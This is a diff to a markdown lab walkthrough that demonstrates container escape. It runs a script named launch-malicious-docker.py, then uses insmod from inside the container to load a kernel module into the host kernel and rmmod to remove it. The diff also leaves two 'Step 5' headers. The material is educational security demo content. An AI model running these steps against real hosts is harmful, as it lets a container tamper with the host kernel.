@@ -329,7 +329,7 @@ virtualenv venv
 
 source venv/bin/activate
 
-pip install -r requirements.txt
+pip install docker
 
 python launch-malicious-docker.py
 ```
@@ -354,17 +354,36 @@ apt update && apt install -y kmod
 lsmod
 ``` 
 
-* Remove the `floppy` module that has been previously loaded and confirm
+-------
+
+#### Step 5:
+
+
+* Vulnerable and Malicious Kernel modules can also be loaded from the container onto the host-machine kernel
 
 ```commandline
-rmmod floppy
+insmod /rootFS/lib/modules/4.x.x-xxx-generic/kernel/fs/isofs/isofs.ko
 
-lsmod
+lsmod | grep isofs
+```
+
+* Switch to the provisioned server and confirm if the Malicious kernel module has been loaded successfully
+
+```commandline
+lsmod | grep isofs
 ```
 
 -------
 
 #### Step 5:
+
+* Remove the `isofs` module that has been previously loaded and confirm
+
+```commandline
+rmmod isofs
+
+lsmod
+```
 
 * Stop all containers
 
